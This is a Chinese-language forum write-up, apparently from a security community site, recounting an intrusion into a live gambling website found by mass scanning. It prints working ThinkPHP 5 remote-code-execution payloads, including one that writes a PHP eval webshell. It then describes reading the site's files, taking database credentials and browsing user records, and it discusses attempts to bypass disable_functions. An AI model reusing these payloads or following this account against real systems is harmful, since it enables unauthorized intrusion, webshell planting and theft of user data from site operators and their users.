**前提摘要：**  
通过批量的爬取和扫描，寻找到了个目标站点，是个关于bc的站点。兄弟们冲了他！  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1808e954689dfffb4f29df9788b6a90a05904b20.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1808e954689dfffb4f29df9788b6a90a05904b20.png)

**渗透过程**  
首先肯定先搞一波基础的信息收集，跑一跑目录，端口号等等。  
通过目录的扫描一下发现了个惊喜，thinkphp的版本直接就出来了，没想到呀  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b5c98a092e5dceed3c18f89ce208de226a0ed68.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b5c98a092e5dceed3c18f89ce208de226a0ed68.png)  
话不多说直接开干，添加进入goby简单验证下存不存在洞洞  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9a605f8470066292e6ca942d2c86901af45d255f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9a605f8470066292e6ca942d2c86901af45d255f.png)  
没想到我运气经如此的好  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-507be032570fac00358be3177a1d8186aa6f45d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-507be032570fac00358be3177a1d8186aa6f45d8.png)  
直接替换成系统命令函数，我倒，竟然不行，那就只能换个函数试试，经过测试发现什么eval，system呀什么都不行，哎果然bc站点不是这么容易的，哭哭。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e420d4de47f85d5ee37542c578174e5a739e159.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e420d4de47f85d5ee37542c578174e5a739e159.png)  
想着既然goby的poc验证失败了，尝试下手工输入poc了，这里感谢下这位大佬的文章，令我受益匪浅  
文章：<https://y4er.com/post/thinkphp5-rce/>  
在经过一顿输入poc验证后发现，所有的执行命令的poc都不行，都会提示系统错误  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-97e8f1f7cdbea854bd5d4c7d4a808ea58169b4c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-97e8f1f7cdbea854bd5d4c7d4a808ea58169b4c1.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-533329e644e80d3f90ecb93f7b7d91c85a2a86ba.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-533329e644e80d3f90ecb93f7b7d91c85a2a86ba.png)

感觉是disable\_functions禁用了函数，想着看看能不能看到phpinfo信息。  
Payload :  
\_method=\_\_construct&amp;method=get&amp;filter\[\]=call\_user\_func&amp;get\[\]=phpinfo  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-147342143374cd07e30bdbf09112bc83fab53d9b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-147342143374cd07e30bdbf09112bc83fab53d9b.png)

惊喜出现，直接搜索下disable\_functions看看到底禁用了多少  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f24c7717580936af8d8b5c260055b86316068c2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f24c7717580936af8d8b5c260055b86316068c2a.png)

我倒，禁用的还真不少，能用的代码执行函数全给禁了,在我一筹莫展之际经过大佬们的指点后，可以试试写入shell文件试试  
Payload  
POST：  
s=file\_put\_contents('test.php','&lt;eval($\_POST);')&amp;\_method=\_\_construct&amp;method=POST&amp;filter\[\]=assert

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-030c0f3a03b4147f6dbaed7b49aa9afb8922f936.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-030c0f3a03b4147f6dbaed7b49aa9afb8922f936.png)  
直接拿下，测试除了不能执行命令外，网站文件都可以看，还翻到了数据库的密码，可惜不是root的，看着目录结构像是某塔的。  
连上数据库看看，好家伙还不少人呀。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7de6e8cc02165df60494c93ba7aba9a00eb2d8f7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7de6e8cc02165df60494c93ba7aba9a00eb2d8f7.png)

既然拿下shell了，就想着bypass下disable\_functions吧。  
经过信息整理：环境为nginx、php5.6、linux、某塔搭建的  
先来尝试下蚁剑过disable\_functions插件，果然经过测试都失败了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-893f7783a9110fd7264755e379b00eb71fc8a9c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-893f7783a9110fd7264755e379b00eb71fc8a9c4.png)  
难受住了，姜，只能网上找找文章看看原理了，看看为什么不行  
首先看看蚁剑上面的第一个绕过方法:LD\_PRELOAD方法  
具体的可以看看这篇文章，只能说大佬牛皮！  
<https://www.freebuf.com/articles/web/192052.html>  
我也下了个github的项目过LD\_PRELOAD的  
[https://github.com/yangyangwithgnu/bypass\_disablefunc\_via\_LD\_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee23f09118124ed304355a1609fe1238b6b78428.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ee23f09118124ed304355a1609fe1238b6b78428.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3448566a2f31143be638e079cbc16f4206105a8d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3448566a2f31143be638e079cbc16f4206105a8d.png)

一看到函数我感觉可能问题就出在这个，接着一查果然disable\_functions禁用了这个函数，姜放弃下一个  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-328e704ecb8fab13d299e078cdf76c2ec0540b55.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-328e704ecb8fab13d299e078cdf76c2ec0540b55.png)

第二个是php-fpm的绕过  
具体的可以看下这个文章  
<https://www.freebuf.com/articles/network/263540.html>

经过测试还是没有成功，剩下的几个方法我就不一一说了，有些是环境不支持，有些是函数被禁用了，不过总体来讲还可以，毕竟某塔还是强，如果各位师傅们有更好的思路，能执行命令的话，请多带带弟弟